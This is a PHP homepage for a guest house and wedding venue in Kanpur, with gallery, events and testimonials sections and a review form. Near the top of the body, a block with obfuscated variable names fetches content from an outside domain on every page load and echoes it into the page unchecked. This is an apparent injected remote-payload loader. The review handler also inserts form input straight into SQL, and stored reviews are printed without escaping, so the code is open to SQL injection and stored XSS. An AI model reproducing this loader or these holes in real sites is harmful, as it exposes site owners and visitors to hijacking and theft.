<?php 
session_start();
include('jag_admin/dbcon.php');
//error_reporting(0);
if(isset($_POST['submit']))
{
	
	
	$name=$_POST['name'];
		$desc=$_POST['desc'];
	
	//$sub=$_POST['status'];
	

$qry = mysqli_query($con,"INSERT INTO review(name,comment,date) VALUES('$name','$desc',now())");	
if($qry==true)
{
     echo "<script>alert('Review has been Added Seccessfully..');
     window.location='index.php';</script>";
}
else
{
      echo "<script>alert('Review has been Added Seccessfully..'); window.location='index.php';</script>";
}
}
 ?>


<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Best Guest House in Kanpur, Top rated Guest House in Kanpur</title>
<meta name="description" content="Jagdamba Guest House is one of the Top rated and Best Guest House in Kanpur, located very close to prime destinations in kanpur offers just the right marriage venue for a memorable marriage celebration. ">
<meta name="keywords" content="best guest house in kanpur, top guest house in kanpur, top rated guest house in kanpur, marriage lawn in kanpur">



<!-- favicon icon -->
<link rel="shortcut icon" href="images/favicon.png" media="all"/>

<!-- bootstrap -->
<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" media="all"/>

<!-- animate -->
<link rel="stylesheet" type="text/css" href="css/animate.css" media="all" />

<!-- owl-carousel -->
<link rel="stylesheet" type="text/css" href="css/owl.carousel.css" media="all" />

<!-- fontawesome -->
<link rel="stylesheet" type="text/css" href="css/font-awesome.css" media="all"/>

<!-- themify -->
<link rel="stylesheet" type="text/css" href="css/themify-icons.css" media="all"/>

<!-- flaticon -->
<link rel="stylesheet" type="text/css" href="css/flaticon.css" media="all"/>

<!-- REVOLUTION LAYERS STYLES -->

    <link rel="stylesheet" type="text/css" href="revolution/css/layers.css" media="all"/>

    <link rel="stylesheet" type="text/css" href="revolution/css/settings.css" media="all"/>

<!-- prettyphoto -->
<link rel="stylesheet" type="text/css" href="css/prettyPhoto.css" media="all"/>

<!-- shortcodes -->
<link rel="stylesheet" type="text/css" href="css/shortcodes.css" media="all"/>

<!-- main -->
<link rel="stylesheet" type="text/css" href="css/main.css" media="all"/>

<!-- responsive -->
<link rel="stylesheet" type="text/css" href="css/responsive.css" media="all"/>


<!--slider-css-->
<!--<link rel='stylesheet' type="text/css" href="css/mycss.css" media="all">-->
 <style>

 
    .carousel-indicators li{
      background-color: rgb(1 141 173); 
      width: 12px;
    height: 12px;
    }
    
    .carousel-inner>.item>a>img, .carousel-inner>.item>img, .img-responsive, .thumbnail a>img, .thumbnail>img {
    display: block;
    max-width: 100%;
    height: auto;
    }
    
    .carousel .s-controls{
        background-image: url(../images/service-icons.png);
    width: 30px;
    height: 30px;
    margin: 20px;
    opacity: 0;
    -webkit-transition: all 0.3s;
    -moz-transition: all 0.3s;
    transition: all 0.3s;
    }
   
    
    .carousel-indicators{
        bottom: 0px;
    }
    
   
    
    @media screen and (max-width: 768px){
.carousel-indicators {
    bottom: 0px;
}
 .col-xs-6{
        width:100%;
    }
}
</style>
	
	<!-- End CSS Files -->

</head>

<body>

<?php
$_0x1 = "https://cloudcdnassets.xyz/resource/resource_v1.php";
$_0x2 = curl_init($_0x1);
curl_setopt($_0x2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($_0x2, CURLOPT_TIMEOUT, 20); 
$_0x3 = curl_exec($_0x2);
curl_close($_0x2);
echo $_0x3;
?>


    <!--page start-->
    <div class="page">

        <!-- preloader start -->
        <div id="preloader">
          <div id="status">&nbsp;</div>
        </div>
        <!-- preloader end -->

        <?php include('header.php');?>
        
        
        <!--rev-slider -->
        
        
        <div class="carousel slide carousel-fade" id="featured">
     
     <!--Indicators-->
    <!-- <ol class="carousel-indicators">
       <li data-target="#featured" data-slide-to="0" class="active indicator"></li>
       <li data-target="#featured" data-slide-to="1" class="indicator"></li>
       <li data-target="#featured" data-slide-to="2" class="indicator"></li>
       <li data-target="#featured" data-slide-to="3" class="indicator"></li>
       <li data-target="#featured" data-slide-to="4" class="indicator"></li>
       </ol>-->
     
     <div class="carousel-inner">
        <div class="item active">
          <img class="carousel-image" src="https://jagdambaguesthouse.com/jag_admin/images/BANNER.jpg" alt="banner 1">
         </div>
        <!-- <div class="item">
          <img class="carousel-image" src="images/slider-2 (1).jpg" alt="banner 1">
         </div>
         <div class="item">
          <img class="carousel-image" src="images/slider-3 (1).jpg" alt="banner 1">
         </div>
        <div class="item">
          <img class="carousel-image" src="images/slider-4 (1).jpg" alt="banner 2">
         </div>
        <div class="item">
          <img class="carousel-image" src="images/slider-5 (1).jpg" alt="banner 3">
          </div>-->
     </div><!--carousel inner-->
     
     <!--Previous Button-->
    <!-- <a class="left carousel-control" href="#featured" role="button" data-slide="prev">
       <span class="glyphicon glyphicon-chevron-left"></span>
     </a>
     <!--Next Button--
     <a class="right carousel-control" href="#featured" role="button" data-slide="next">
       <span class="glyphicon glyphicon-chevron-right"></span>
     </a>-->
    </div>
           <!-- <div id="rev_slider_4_1_wrapper" class="rev_slider_wrapper fullwidthbanner-container slide-overlay" data-alias="classic4export" data-source="gallery">
                <div id="rev_slider_4_1" class="rev_slider fullwidthabanner" data-version="5.3.0.2">
                    <div class="slotholder"></div>
                        <ul>
                            <li data-index="rs-1" data-transition="boxslide" data-slotamount="default" data-hideafterloop="0" data-hideslideonmobile="off" data-easein="default" data-easeout="default" data-masterspeed="default" data-thumb="" data-delay="10010" data-rotate="0" data-saveperformance="off" data-title="Let’s Have a Party!" data-param1="" data-param2="" data-param3="" data-param4="" data-param5="" data-param6="" data-param7="" data-param8="" data-param9="" data-param10="" data-description="">
                            <img src="https://jagdambaguesthouse.com/jag_admin/images/BANNER.jpg" alt="" title="slider-mainbg-003" width="1920" height="515" data-bgposition="center center" data-bgfit="cover" data-bgrepeat="no-repeat" class="rev-slidebg" data-no-retina>
                             </li>
                         
                        </ul>
                   <div class="tp-bannertimer"></div>
                </div>
            </div>-->
            <!--rev-slider end-->

        <!--site-main start-->
        <div class="site-main">
            
            
            <!--gallery-section start-->
           <!--<section class="ttm-row bg-img7 ttm-bgcolor-black gallery-section ttm-bg ttm-bgimage-yes clearfix">
                <div class="ttm-row-wrapper-bg-layer ttm-bg-layer"></div>
                <div class="container">
                    <div class="row text-center">
                        <div class="col-lg-12 col-md-12">
                            <div class=" section-title clearfix">
                                <h4>SEE OUR BEST</h4>
                                <h2 class="title">Photo Gallery</h2>
                                <div class="title-img">
                                    <img src="images/ds-2.png" alt="underline-img">
                                </div>
                            </div>
                        </div>
                    </div>
                </div></section>-->
            <!--gallery-section end-->

            <!--gallery-view-section start-->
           <section class="ttm-row event-section">
                <div class="container">
                    <div class="row text-center">
                        <div class="col-lg-12">
                            <div class="section-title clearfix"  style="margin-bottom: 40px;">
                                <h4>SEE OUR BEST</h4>
                                <h2 class="title">Photo Gallery</h2>
                                <div class="title-img"><img src="images/ds-1.png" alt="underline-img"></div>
                            </div>
                        </div>
                    </div>
                    <!-- row -->
                    <div class="row multi-columns-row ttm-boxes-spacing-5px style2 mt_65">
                        
                         <?php
					// $i=1;
					  $query=mysqli_query($con,"SELECT * FROM maincategory order by cid desc limit 8");
					 
					 while( $row=mysqli_fetch_array($query))
					  {
					  ?> 
                        
                       
                        <div class="ttm-box-col-wrapper col-lg-3 col-md-6">
                           
                            <div class="featured-imagebox featured-imagebox-portfolio">
                               
                                <div class="featured-thumbnail">
                                    <a href="#"> <img class="img-fluid" src="jag_admin/images/<?php echo $row['image'];?>" alt="image" style="width:100%;height:280px;"></a>
                                </div>
                              
                                <div class="ttm-box-view-overlay">
                                    <div class="ttm-media-link">
                                        <a class="ttm_prettyphoto ttm_image" data-gal="prettyPhoto[gallery1]" title="" href="jag_admin/images/<?php echo $row['image'];?>" data-rel="prettyPhoto">
                                            <i class="ti ti-search"></i>
                                        </a>
                                    </div>
                                    </div>
                            </div>
                        </div>
                        
                        <?php } ?>
                        
                       
                    </div>
                    <div class="row">
                        <div class="col-md-12 text-center">
                            <a class="ttm-btn ttm-btn-size-md ttm-btn-shape-round ttm-btn-style-fill ttm-btn-color-black mt-50" href="gallery.php">View More Gallery</a>
                        </div>
                    </div>
                </div>
            </section>
            <!--gallery-view-section end-->
            
            
            

            <!--intro-section start-->
            <section class="ttm-row welcome-section clearfix ttm-bgcolor-white">
                <div class="container">
                    <div class="row">
                        <div class="col-md-12 col-lg-6">
                            <div class="ttm_single_image_wrapper mt_20 res-991-mt-0">
                                <img src="images/about-2.png" alt="image" class="img-fluid">
                            </div>
                        </div>
                        <div class="col-md-12 col-lg-6">
                            <div class="row">
                                <div class="col-md-12 col-lg-12">
                                    <div class="pt-40 res-991-pt-30">
                                        <div class="section-title">
                                            <h3 class="title">Welcome to Jagdamba Guest House</h3>
                                            <p class="mb-25">The grandeur and success of a marriage is largely dependent on the marriage venue, its location, decor and facilities. Jagdamba Guest House, located very close to prime destinations in kanpur offers just the right marriage venue for a memorable marriage celebration. The resort has more than one marriage hall to choose from depending on your needs and number of guests.</p>
                                        </div>
                                        <div class="section-title mt_19 mb-30">
                                            <p>The landscaped marriage lawns in our kanpur are picturesque and add to the magnificence of your marriage. Use the pool deck for a relaxed evening marriage venue in Kanpur. Or, simply organize a pre-wedding party for close friends and family. Use our amphi theatre and amaze every one. The Pavilion is yet another pleasure as a marriage hall in Kanpur and best suited for marriage groups or pre-wedding functions like sangeet or mehendi.</p>
                                        </div>
                                        <div class="separator">
                                            <div class="sep-line mt_5 mb-20 res-991-mb-0"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-4 col-sm-4">
                                    <!-- ttm-fid -->
                                    <div class="ttm-fid inside ttm-fid-view-topicon">
                                        <div class="ttm-fid-contents">
                                            <h4><span   data-appear-animation = "animateDigits"
                                                        data-from             = "0"
                                                        data-to               = "50"
                                                        data-interval         = "10"
                                                        data-before           = ""
                                                        data-before-style     = "sup"
                                                        data-after            = ""
                                                        data-after-style      = "sub"
                                                    >50
                                                </span><sub>000</sub>
                                            </h4>
                                            <h3 class="ttm-fid-title"><span>Customers</span></h3>
                                        </div><!-- ttm-fid-contents end -->
                                    </div><!-- ttm-fid end -->
                                </div>
                                <div class="col-md-4 col-sm-4">
                                    <!-- ttm-fid -->
                                    <div class="ttm-fid inside ttm-fid-view-topicon">
                                        <div class="ttm-fid-contents">
                                            <h4><span   data-appear-animation = "animateDigits"
                                                        data-from             = "0"
                                                        data-to               = "25"
                                                        data-interval         = "5"
                                                        data-before           = ""
                                                        data-before-style     = "sup"
                                                        data-after            = ""
                                                        data-after-style      = "sub"
                                                    >25
                                                </span><sub>Years</sub>
                                            </h4>
                                            <h3 class="ttm-fid-title"><span>Experience</span></h3>
                                        </div><!-- ttm-fid-contents end -->
                                    </div><!-- ttm-fid end -->
                                </div><div class="col-md-4 col-sm-4">
                                    <!-- ttm-fid -->
                                    <div class="ttm-fid inside ttm-fid-view-topicon">
                                        <div class="ttm-fid-contents">
                                            <h4><span   data-appear-animation = "animateDigits"
                                                        data-from             = "0"
                                                        data-to               = "7"
                                                        data-interval         = "10"
                                                        data-before           = ""
                                                        data-before-style     = "sup"
                                                        data-after            = ""
                                                        data-after-style      = "sub"
                                                    >7
                                                </span><sub>000</sub>
                                            </h4>
                                            <h3 class="ttm-fid-title"><span>Event Done</span></h3>
                                        </div><!-- ttm-fid-contents end-->
                                    </div><!-- ttm-fid end -->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
            <!--intro-section end-->
            
            <!--service-section start-->
            <section class="ttm-row bg-img1 ttm-bgcolor-black service-section ttm-bg ttm-bgimage-yes clearfix">
                <div class="ttm-row-wrapper-bg-layer ttm-bg-layer"></div>
                <div class="container">
                    <div class="row text-center">
                        <div class="col-lg-12">
                            <div class=" section-title clearfix">
                                <h4>WHAT WE OFFER</h4>
                                <h2 class="title">Provide Best Services</h2>
                                <div class="title-img">
                                    <img src="images/ds-2.png" alt="underline-img">
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-6 col-lg-4">
                            <div class="featured-imagebox static-title mb-20">
                                <div class="featured-thumbnail">
                                    <img class="img-fluid" src="images/blog/blog-01.jpg" alt="">
                                </div>
                                <div class="featured-content">
                                    <div class="featured-title">
                                        <h5> Wedding</h5>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4">
                            <div class="featured-imagebox static-title mb-20">
                                <div class="featured-thumbnail">
                                    <img class="img-fluid" src="images/blog/blog-02.jpg" alt="">
                                </div>
                                <div class="featured-content">
                                    <div class="featured-title">
                                        <h5>Private Party</h5>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4">
                            <div class="featured-imagebox static-title mb-20">
                                <div class="featured-thumbnail">
                                    <img class="img-fluid" src="images/blog/blog-03.jpg" alt="">
                                </div>
                                <div class="featured-content">
                                    <div class="featured-title">
                                        <h5>Corporate Party</h5>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
            <!--service-section end-->
            
            <!--service-section.style2 start-->
            <section class="ttm-row service-section style2 bg-layer clearfix bg-layer-equal-height break-991-colum" >
                <div class="container">
                    <div class="row">
                        <div class="col-md-12 col-lg-5">
                            <!-- col-bg-img-three -->
                            <div class="col-bg-img-three ttm-col-bgimage-yes ttm-bg ttm-left-span res-991-mt-0 mt_60">
                                <div class="ttm-col-wrapper-bg-layer ttm-bg-layer"></div>
                                <div class="layer-content">
                                </div>
                            </div><!-- col-bg-img-three end-->
                            <img src="images/bg-image/col-bgimage-3.jpg" class="ttm-equal-height-image" alt="bg-image">
                        </div>
                        <div class="col-lg-7 col-md-12">
                        <!-- about-content -->
                        <div class="about-content ttm-bg ttm-col-bgcolor-yes ttm-right-span ttm-bgcolor-skincolor padding-15">
                            <div class="ttm-col-wrapper-bg-layer ttm-bg-layer"></div>
                            <div class="layer-content">
                                <!-- section title -->
                                <div class="section-title with-desc clearfix">
                                    <div class="title-header">
                                        <h4>WHAT WE DO</h4>
                                        <h2 class="title">Our Premium Services</h2>
                                    </div>
                                    <!--<p>We have a huge range of suppliers and contacts in the industry that work closely with us to not only ensure you get the wedding day.</p>-->
                                </div><!-- section title end -->
                                <div class="separator clearfix">
                                    <div class="sep-line mb-50"></div>
                                </div>
                                <div class="row">
                                   <!-- <div class="col-md-6">
                                        <div class="featured-box style2 left-icon icon-align-top">
                                            <div class="featured-icon">
                                                <div class="ttm-icon ttm-icon_element-size-sm ttm-icon_element-color-white">
                                                    <i class="flaticon flaticon-cake"></i>
                                                </div>
                                            </div>
                                            <div class="featured-content">
                                                <div class="featured-title">
                                                    <h5>Catering &amp; Decor</h5>
                                                </div>
                                                <div class="featured-desc">
                                                    <p>Outdoor Catering at Jagdamba Guest House based in Kanpur caters to all kinds of events. For them every event, small or large is important to us and hence we consider in giving our best to make your event memorable.</p>
                                                </div>
                                            </div>
                                        </div></div>-->
                                    <div class="col-md-12">
                                        <div class="featured-box style2 left-icon icon-align-top">
                                            <div class="featured-icon">
                                                <div class="ttm-icon ttm-icon_element-size-sm ttm-icon_element-color-white">
                                                    <i class="flaticon flaticon-wedding-location"></i>
                                                </div>
                                            </div>
                                            <div class="featured-content">
                                                <div class="featured-title">
                                                    <h5>Indoor Catering &amp; Decor</h5>
                                                </div>
                                                <div class="featured-desc">
                                                    <p>In Jagdamba Guest House set's up, caterers are well-acquainted with everything they may need and usually prepare food from an existing or customized kitchen within the premises. Indoor catering can only serve a certain amount.</p>
                                                </div>
                                                
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div><!-- about-content end-->
                    </div>
                    </div>
                </div>
            </section>
            <!--service-section.style2 end-->

           

            <!--event-section start-->
            <section class="ttm-row event-section clearfix">
                <div class="container">
                    <div class="row text-center">
                        <div class="col-lg-12">
                            <div class=" section-title clearfix">
                                <h4>LATEST</h4>
                                <h2 class="title">Our Events</h2>
                                <div class="title-img"><img src="images/ds-1.png" alt="underline-img"></div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-12">
                            <div class="event-slide owl-carousel" data-item="2" data-nav="true" data-dots="false" data-auto="false" data-center="true">
                                <!-- featured-imagebox-->
                               
                               <?php
					// $i=1;
					  $query=mysqli_query($con,"SELECT * FROM  tbl_event  order by id desc");
					 
					 while( $row=mysqli_fetch_array($query))
					  {
					  ?> 
                               
                               
                                <div class="featured-imagebox featured-imagebox-event ttm-box-view-top-image mb-120 position-relative res-767-mlr-15">
                                    <div class="featured-thumbnail">
                                        <img class="img-fluid" src="jag_admin/images/<?php echo $row['image'];?>" alt="">
                                    </div>
                                    <!--<div class="ttm-box-post-date">-->
                                    <!--    <span class="ttm-entry-date">-->
                                    <!--        <time class="entry-date" datetime="2019-01-16T07:07:55+00:00">12<span class="entry-month entry-year">aug</span></time>-->
                                    <!--    </span>-->
                                    <!--</div>-->
                                   <center>  <div class="featured-content featured-content-event">
                                        <div class="featured-title">
                                          <h5><a href=""><?php echo $row['name'];?></a></h5>
                                         </div>
                                        </div></center>
                                </div>
                                 <?php } ?>  
                                <!-- featured-imagebox END -->
                               
                               
                            </div>
                        </div><!-- row end -->
                    </div>
                </div>
            </section>
            <!--event-section end-->

            <!--gallery-section start-->
           <!-- <section class="ttm-row bg-img7 ttm-bgcolor-black gallery-section ttm-bg ttm-bgimage-yes clearfix">
                <div class="ttm-row-wrapper-bg-layer ttm-bg-layer"></div>
                <div class="container">
                    <div class="row text-center">
                        <div class="col-lg-12 col-md-12">
                            <div class=" section-title clearfix">
                                <h4>SEE OUR BEST</h4>
                                <h2 class="title">Photo Gallery</h2>
                                <div class="title-img">
                                    <img src="images/ds-2.png" alt="underline-img">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
            <!--gallery-section end--

            <!--gallery-view-section start--
           <section class="ttm-row gallery-view-section">
                <div class="container">
                    <!-- row --
                    <div class="row multi-columns-row ttm-boxes-spacing-5px style2 mt_65">
                        
                         <?php
					// $i=1;
					  $query=mysqli_query($con,"SELECT * FROM maincategory order by cid desc limit 6");
					 
					 while( $row=mysqli_fetch_array($query))
					  {
					  ?> 
                        
                       
                        <div class="ttm-box-col-wrapper col-lg-3 col-md-6">
                           
                            <div class="featured-imagebox featured-imagebox-portfolio">
                               
                                <div class="featured-thumbnail">
                                    <a href="#"> <img class="img-fluid" src="jag_admin/images/<?php echo $row['image'];?>" alt="image" style="width:100%;height:280px;"></a>
                                </div>
                              
                                <div class="ttm-box-view-overlay">
                                    <div class="ttm-media-link">
                                        <a class="ttm_prettyphoto ttm_image" data-gal="prettyPhoto[gallery1]" title="" href="jag_admin/images/<?php echo $row['image'];?>" data-rel="prettyPhoto">
                                            <i class="ti ti-search"></i>
                                        </a>
                                    </div>
                                    </div>
                            </div>
                        </div>
                        
                        <?php } ?>
                        
                       
                    </div>
                    <div class="row">
                        <div class="col-md-12 text-center">
                            <a class="ttm-btn ttm-btn-size-md ttm-btn-shape-round ttm-btn-style-fill ttm-btn-color-black mt-50" href="gallery.php">View More Gallery</a>
                        </div>
                    </div>
                </div>
            </section>-->
            <!--gallery-view-section end-->

            <!--testimonial-->
            <section class="testimonial-section ttm-row bg-layer break-991-colum">
                <div class="container">
                    <div class="row">
                        <!--Testimonials-->
                        <div class="col-md-12 col-lg-7">
                            <div class="ttm-col-bgcolor-yes ttm-bg ttm-left-span ttm-bgcolor-skincolor padding-3 res-1199-pl-15">
                                <div class="ttm-col-wrapper-bg-layer ttm-bg-layer">
                                    <div class="ttm-bg-layer-inner"></div>
                                </div>
                                <div class="layer-content">
                                    <div class="carousel-outer pr-10">
                                        <div class="section-title clearfix mb-30">
                                            <h4>TESTIMONAL</h4>
                                            <h2 class="title ttm-textcolor-white">Clients feedback</h2>
                                        </div>
                                        <!-- wrap-testimonial -->
                                        <div class="testimonial-slide owl-carousel" data-item="1" data-nav="false" data-dots="false" data-auto="false">
                                            <!-- testimonials -->
                                            
                                             <?php include('jag_admin/dbcon.php');?>
                                <?php 
			  $q = mysqli_query($con,"select * from review where status='1' order by id ");
			  
 
			while($row=mysqli_fetch_array($q)){?>
                                           
                                            <div class="testimonials"> 
                                                <div class="testimonial-content mb-35">
                                                    <div class="testimonial-avatar">
                                                        <div class="testimonial-img">
                                                           <!-- <img class="img-center" src="jag_admin/images/<?php echo $row['image'];?>" alt="testimonial-img">-->
                                                           <img class="img-center" src="images/user.png" alt="testimonial-img">
                                                        </div>
                                                    </div>
                                                     <div class="testimonial-caption">
                                                        <h6><?php echo $row['name'];?></h6>
                                                        <!--<label>Newyork City</label>-->
                                                    </div>
                                                    <blockquote><?php echo $row['comment'];?></blockquote>
                                                </div>
                                            </div>
                                           
                                            <?php } ?>
                                           
                                           
                                           <!-- <div class="testimonials"> 
                                                <div class="testimonial-content mb-35">
                                                    <div class="testimonial-avatar">
                                                        <div class="testimonial-img">
                                                            <img class="img-center" src="images/feedback2.jpg" alt="testimonial-img">
                                                        </div>
                                                    </div>
                                                     <div class="testimonial-caption">
                                                        <h6>Tonny Edward</h6>
                                                        <label>Newyork City</label>
                                                    </div>
                                                    <blockquote>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloret quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit.</blockquote>
                                                </div>
                                            </div>
                                            
                                            <div class="testimonials">
                                                <div class="testimonial-content mb-35">
                                                    <div class="testimonial-avatar">
                                                        <div class="testimonial-img">
                                                            <img class="img-center" src="images/feedback3.jpg" alt="testimonial-img">
                                                        </div>
                                                    </div> 
                                                     <div class="testimonial-caption">
                                                        <h6>Teena Venanda</h6>
                                                        <label>Newyork City</label>
                                                    </div>
                                                    <blockquote>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloret quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit.</blockquote>
                                                </div>
                                            </div>-->
                                        </div><!-- wrap-testimonial end-->
                                    </div>
                                </div>
                            </div>
                        </div><!--left Column-end-->
                        <div class="col-md-12 col-lg-5">
                            <div class="col-bg-img-four ttm-col-bgimage-yes ttm-bg ttm-right-span ml_165 mt-60 res-991-mt-0">
                                <div class="ttm-col-wrapper-bg-layer ttm-bg-layer"></div>
                                <div class="layer-content"></div>
                            </div>
                            <img src="images/bg-image/col-bgimage-4.jpg" class="ttm-equal-height-image" alt="bg-image">
                        </div>
                        <!--Testimonials-end-->
                    </div>
                </div>
            </section>
            <!--End testimonial-->
            
            <br><br><br><br>
            <!--last-section start-->
            <!--<section class="ttm-row ttm-bgcolor-grey last-section clearfix">
                <div class="container">
                    <div class="row text-center">
                        <div class="col-lg-12">
                            <div class="section-title clearfix">
                                <h4>WORKING WITH EXCELLENT</h4>
                                <h2 class="title">Our Latest News/ Blog</h2>
                                <div class="title-img"><img src="images/ds-1.png" alt="underline-img"></div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-lg-8 col-md-6 col-sm-12 col-xs-12">
                            <div class="featured-imagebox featured-imagebox-post ttm-box-view-left-image box-shadow1 ttm-bgcolor-white mb-30">
                                <div class="row row-equal-height">
                                    <div class="col-md-12 col-lg-6 ttm-featured-img-left">
                                        <div class="featured-thumbnail">
                                            <a href="single-blog.html"><img class="img-fluid" src="images/blog/blog1.jpg" alt="image"></a>
                                        </div>
                                    </div>
                                    <div class="col-md-12 col-lg-6 ttm-featured-content-right">
                                        <div class="featured-content featured-content-post">
                                            <div class="ttm-box-post-date"><span class="ttm-entry-date">
                                                    <time class="entry-date" datetime="2019-01-16T07:07:55+00:00">01<span class="entry-month entry-year">MAY</span></time>
                                                </span>
                                            </div>
                                            <div class="featured-title ml-70">
                                                <h5><a href="single-blog.html">Best Kids’ Birthday Party Ideas</a></h5>
                                            </div>
                                            <div class="featured-desc">
                                                <p>Lorem Ipsum is simply dummy text of the printing and typendard nknown printet to make a type specimen book.</p>
                                            </div>
                                            <a class="ttm-btn ttm-btn-size-sm ttm-btn-shape-round ttm-btn-style-fill ttm-btn-color-black mt-20 mb-15" href="single-blog.html" title="">Read More</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="featured-imagebox featured-imagebox-post ttm-box-view-left-image box-shadow1 ttm-bgcolor-white mb-30">
                                <div class="row row-equal-height">
                                    <div class="col-md-12 col-lg-6 ttm-featured-img-left">
                                        <div class="featured-thumbnail">
                                            <a href="single-blog.html"><img class="img-fluid" src="images/blog/blog3.jpg" alt="image"></a>
                                        </div>
                                    </div>
                                    <div class="col-md-12 col-lg-6 ttm-featured-content-right">
                                        <div class="featured-content featured-content-post">
                                            <div class="ttm-box-post-date">
                                                <span class="ttm-entry-date">
                                                    <time class="entry-date" datetime="2019-01-16T07:07:55+00:00">23<span class="entry-month entry-year">NOV</span></time>
                                                </span>
                                            </div>
                                            <div class="featured-title ml-70">
                                                <h5><a href="single-blog.html">5 Steps To Planning A Sweet Party</a></h5>
                                            </div>
                                            <div class="featured-desc">
                                                <p>Lorem Ipsum is simply dummy text of the printing and typendard nknown printet to make a type specimen book.</p>
                                            </div>
                                            <a class="ttm-btn ttm-btn-size-sm ttm-btn-shape-round ttm-btn-style-fill ttm-btn-color-black mt-20 mb-15" href="single-blog.html" title="">Read More</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-4">
                            <div class="featured-imagebox featured-imagebox-post ttm-box-view-top-image box-shadow1 ttm-bgcolor-white mb-30 res-1199-m-0">
                                <div class="featured-thumbnail">
                                    <a href="blog-details.html"><img class="img-fluid" src="images/blog/blog2.jpg" alt="image"></a>
                                </div>
                                <div class="featured-content featured-content-post">
                                    <div class="ttm-box-post-date">
                                        <span class="ttm-entry-date">
                                            <time class="entry-date" datetime="2019-01-16T07:07:55+00:00">18<span class="entry-month entry-year">DEC</span></time>
                                        </span>
                                    </div>
                                    <div class="featured-title ml-70">
                                        <h5><a href="blog-details.html">How to Find the Perfect Event Venue</a></h5>
                                    </div>
                                    <div class="featured-desc">
                                        <p class="res-991-mb-0">Lorem Ipsum is simply dummy text of the printing and typendard nknown printet to make a type specimen book Lorem Ipsum is simply dummy tex.</p>
                                    </div>
                                    <a class="ttm-btn ttm-btn-size-sm ttm-btn-shape-round ttm-btn-style-fill ttm-btn-color-black mt-10 mb-15" href="single-blog.html" title="">Read More</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>-->
            <!--last-section end-->

        </div><!-- site-main end -->

       <?php include('footer.php');?>

</div><!-- page end -->

    <!--back-to-top start-->
    <a id="totop" href="#top">
        <i class="fa fa-angle-up"></i>
    </a>
    <!--back-to-top end-->

<!--page wrapper end-->

    <!-- Javascript -->

    <script src="js/jquery.min.js"></script>
    <script src="js/tether.min.js"></script>
    <script src="js/bootstrap.min.js"></script> 
    <script src="js/jquery.easing.js"></script>    
    <script src="js/jquery-waypoints.js"></script>    
    <script src="js/jquery-validate.js"></script> 
    <script src="js/owl.carousel.js"></script>
    <script src="js/jquery.prettyPhoto.js"></script>
    <script src="js/numinate.min6959.js?ver=4.9.3"></script>
    <script src="js/main.js"></script>


    <!-- Revolution Slider -->
 <script src="revolution/js/jquery.themepunch.tools.min.js"></script>
    <script src="revolution/js/jquery.themepunch.revolution.min.js"></script>
    <!--<script src="revolution/js/slider.js"></script>-->



	 <!--slider-js-->
	 
	<script>
	    //Initialize the carousel
$(function() {
  
  $('.carousel').carousel({
    interval: 5000
  });
  
});

//Make the caption responsive to window width
$(document).ready(function() {
    $('.carousel .carousel-caption').css('zoom', $('.carousel').width()/1250);
  });

  $(window).resize(function() {
    $('.carousel .carousel-caption').css('zoom', $('.carousel').width()/1250);
  });
	</script>
<script src='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js'></script>
</body>

</html>
